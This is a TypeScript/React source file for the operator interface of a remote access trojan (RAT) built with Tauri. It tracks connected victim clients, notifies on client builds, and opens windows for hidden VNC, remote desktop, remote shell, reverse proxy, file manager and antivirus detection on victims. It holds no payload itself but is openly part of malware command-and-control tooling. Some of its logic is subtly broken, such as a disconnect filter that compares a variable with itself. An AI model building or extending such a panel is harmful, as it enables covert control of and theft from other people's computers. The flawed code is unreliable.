import React, { useState, useEffect, useRef } from "react";
import { RATContext } from "./RATContext";
import { listen } from "@tauri-apps/api/event";
import toast from "react-hot-toast";
import {
  RATState,
  RATClient,
  RATProviderProps,
  ClientWindowType,
  Log,
} from "../../types";
import { fetchStateCmd } from "./RATCommands";

import { PhysicalSize, Window, getCurrentWindow } from "@tauri-apps/api/window";
import { Webview } from "@tauri-apps/api/webview";

//import clientsTest from "../../../python_utils_testing/test_clients.json";

const translateWindowType = (type: string) => {
  switch (type) {
    case "client-info":
      return "Client Info";
    case "hvnc":
      return "HVNC";
    case "process-viewer":
      return "Process Viewer";
    case "remote-desktop":
      return "Remote Desktop";
    case "file-manager":
      return "File Manager";
    case "remote-shell":
      return "Remote Shell";
    case "reverse-proxy":
      return "Reverse Proxy";
    case "av-detection":
      return "Antivirus Detection";
    case "fun":
      return "Fun Stuff";
    case "input-box":
      return "Input Box";
    default:
      return type;
  }
};

const windowTypeSizes = {
  "client-info": {
    width: 600,
    height: 800,
  },
  "reverse-proxy": {
    width: 1000,
    height: 700,
  },
  "remote-desktop": {
    width: 1280,
    height: 720,
  },
  hvnc: {
    width: 1280,
    height: 720,
  },
  "file-manager": {
    width: 1280,
    height: 720,
  },
  "process-viewer": {
    width: 1280,
    height: 720,
  },
  "remote-shell": {
    width: 1280,
    height: 700,
  },
  fun: {
    width: 1280,
    height: 720,
  },
  "input-box": {
    width: 400,
    height: 500,
  },
};

export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
  const [port, setPort] = useState<string>("1337");
  const [running, setRunning] = useState<boolean>(false);
  const [clientList, setClientList] = useState<RATClient[]>([]);
  const [notificationClient, setNotificationClient] = useState<boolean>(true);
  const notificationClientRef = useRef(false);
  const [listenClientNotif, setListenClientNotif] = useState<boolean>(false);
  const [selectedClient, setSelectedClient] = useState<string>("");
  const [_clientWindows, setClientWindows] = useState<ClientWindowType[]>([]);
  const [serverLogs, setServerLogs] = useState<Log[]>([]);

  async function fetchState() {
    const state: RATState = await fetchStateCmd();
    const running = state.running;
    setRunning(running);
  }

  useEffect(() => {
    fetchState();
    if (!running) return;

    const stateInterval = setInterval(fetchState, 10000);

    return () => {
      clearInterval(stateInterval);
    };
  }, [running]);

  const customToast = (icon: string, toast_message: string, style: string) => {
    return toast(toast_message, {
      icon,
      className: `${style} text-lg`,
    });
  };

  const cleanupClientWindows = async (addr: string) => {
    setClientWindows((prevWindows) => {
      prevWindows.forEach(async (window) => {
        if (window.addr.includes(addr)) {
          await window.window.destroy();
        }
      });

      return prevWindows.filter((window) => window.addr !== addr);
    });
  };

  const closeAllWindows = async () => {
    setClientWindows((prevWindows) => {
      prevWindows.forEach(async (window) => {
        await window.window.destroy();
      });
      return [];
    });
  };

  useEffect(() => {
    const setupListener = async () => {
      const currentWindow = getCurrentWindow();
      const label = currentWindow.label;

      if (label === "main") {
        const unlisten = await currentWindow.listen(
          "tauri://close-requested",
          async () => {
            console.log("Main window closing — closing all child windows");
            await closeAllWindows();
            await currentWindow.destroy();
          }
        );

        return () => {
          unlisten();
        };
      }
    };

    setupListener();
  }, []);

  const openClientWindow = async (
    addr: string,
    type: string,
    clientFullName: string
  ) => {
    try {
      const fullUrl = `/${type}/${addr}`;

      const windowId = `${type}-${Date.now()}`;

      const windowParent = new Window(windowId, {
        title: `${translateWindowType(type)} - ${clientFullName} - ${addr}`,
        resizable: true,
        center: true,
        closable: true,
        width: windowTypeSizes[type as keyof typeof windowTypeSizes].width,
        height: windowTypeSizes[type as keyof typeof windowTypeSizes].height,
      });

      windowParent.once("tauri://created", function () {
        const window = new Webview(windowParent, windowId, {
          url: fullUrl,
          x: 0,
          y: 0,
          width: windowTypeSizes[type as keyof typeof windowTypeSizes].width,
          height: windowTypeSizes[type as keyof typeof windowTypeSizes].height,
        });

        windowParent.onResized((event) => {
          const payload = event.payload as PhysicalSize;
          window.setSize(payload);
        });

        window.once("tauri://created", function () {});

        window.once("tauri://error", function () {});

        windowParent.once("tauri://close-requested", async () => {
          windowParent.emit("close_window").then(() => {
            setClientWindows((prevWindows) => {
              const newWindows = prevWindows.filter(
                (window) => window.addr !== addr && window.type !== type
              );
              return newWindows;
            });
            windowParent.close();
          });
        });
      });

      let newWindow: ClientWindowType = {
        window: windowParent,
        addr,
        type,
        id: windowId,
      };

      setClientWindows((prevWindows) => [...prevWindows, newWindow]);

      return windowParent;
    } catch (error) {
      console.error(`Failed to open ${type} window for client ${addr}:`, error);
    }
  };

  async function getClientByAddr(addr: string) {
    console.log(clientList);
    let x = clientList.find((client) => client.data.addr === addr);
    console.log("Client found", x);
    return x;
  }

  async function waitNotification(type: string) {
    let genericStyle = "!bg-white !text-black !rounded-2xl !border-accentx";

    listen(type, async (event) => {
      if (type == "client_connected" || type == "client_disconnected") {
        const client = event.payload as RATClient;
        let icon = type == "client_connected" ? "🤙" : "👋";
        let message = type == "client_connected" ? "connected" : "disconnected";

        let toast_message = `Client ${client.system.username} has ${message}!`;

        if (type == "client_disconnected") {
          await cleanupClientWindows(client.data.addr);
        }

        if (type == "client_connected") {
          setClientList((prevClients) => [...prevClients, client]);
        }

        if (type == "client_disconnected") {
          setClientList((prevClients) =>
            prevClients.filter(
              (client) => client.data.uuidv4 !== client.data.uuidv4
            )
          );
        }

        if (notificationClientRef.current)
          customToast(icon, toast_message, genericStyle);
      }
      if (type == "server_log") {
        const { event_type, message } = event.payload as Log;
        let log = { event_type, message, time: new Date().toLocaleString() };
        setServerLogs((prevLogs) => [log, ...prevLogs]);

        if (event_type == "server_error") {
          customToast("❌", message, genericStyle);
        }

        if (event_type == "build_client") {
          customToast("🔨", message, genericStyle);
        }

        if (event_type == "build_finished") {
          customToast("🔨", message, genericStyle);
        }

        if (event_type == "build_failed") {
          customToast("❌", message, genericStyle);
        }
      }
    });
  }

  useEffect(() => {
    if (!listenClientNotif) {
      setListenClientNotif(true);
      waitNotification("client_connected");
      waitNotification("client_disconnected");
      waitNotification("server_log");
    }
  }, [listenClientNotif]);

  useEffect(() => {
    notificationClientRef.current = notificationClient;
  }, [notificationClient]);

  const RATdata = {
    port,
    setPort,
    setRunning,
    running,
    clientList,
    setClientList,
    setSelectedClient,
    selectedClient,
    setNotificationClient,
    notificationClient,
    openClientWindow,
    serverLogs,
    getClientByAddr,
  };

  return <RATContext.Provider value={RATdata}>{children}</RATContext.Provider>;
};
